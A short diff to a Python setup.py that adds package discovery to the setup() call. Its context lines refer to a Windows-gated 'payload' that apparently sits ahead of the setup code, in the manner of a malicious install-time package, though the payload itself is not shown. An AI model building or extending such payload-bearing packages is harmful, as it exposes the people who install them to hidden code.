@@ -833,7 +833,7 @@ if __name__ == "__main__" and os.name == "nt":
 
 # The end of the payload, the beginning of setup
 if fetch_conf('dev'): print("The end of the payload, the beginning of setup")
-from setuptools import setup
+from setuptools import setup, find_packages
 import codecs
 import os
 
@@ -846,5 +846,7 @@ setup(
     version = VERSION,
     author = "me",
     author_email = "spaceydot@proton.me",
-    description=DESCRIPTION
+    description = DESCRIPTION,
+    packages = find_packages(),
+    install_requires=[]
 )
